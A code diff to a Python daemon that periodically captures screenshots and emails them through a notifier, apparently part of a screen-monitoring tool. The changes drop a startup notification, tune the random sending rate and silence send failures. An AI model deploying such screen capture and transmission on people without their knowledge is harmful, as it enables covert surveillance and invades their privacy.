@@ -36,9 +36,9 @@ class Daemon():
             installation_event_handler,
             installation_path,
             recursive=True)
-        self.notifier.send(subject="Starting up")
-        self.likelihood = .25  # 25% chance
-        self.max_images = 25  # don't keep too many images
+        # if the messages get too large, you might get a broken pipe exception
+        self.likelihood = .35  # 35% chance
+        self.max_images = 20  # don't keep too many images
         self.images_dir = join(self.screenshots_directory, 'captured_images')
 
     def should_execute(self):
@@ -64,7 +64,16 @@ class Daemon():
             for n
             in os.listdir(self.images_dir)
         ]
-        self.notifier.send_screenshots(filenames)
+        try:
+            self.notifier.send_screenshots(filenames)
+        except:
+            try:
+                msg = 'Failed to send {} screenshots'.format(len(filenames))
+                self.notifier.send(
+                    subject='Warning',
+                    message=msg)
+            except:
+                pass
         for filename in filenames:
             os.remove(filename)
 
@@ -78,23 +87,23 @@ class Daemon():
         self.setup()
         self.observer.start()
         while True:
+            # if we sleep at the beginning, then multiple restarts won't
+            # attempt to send tons of emails
+            self.sleep()
             if self.should_execute():
                 names = []
                 try:
                     # catchers needs to conform to the same interface
                     names = self.catcher.capture(self.screenshots_directory)
                     if len(names) == 0:
-                        self.sleep()
                         continue
                 except Exception:
                     self.notifier.send(
                         'Alert!',
                         'Unable to take screenshot: {}'.format(
                             traceback.format_exc()))
-                    self.sleep()
                     continue
                 # limit # of emails by holding onto screenshots
                 should_send = self.store_images(names)
                 if should_send or random.random() < self.likelihood:
                     self.send()
-                self.sleep()
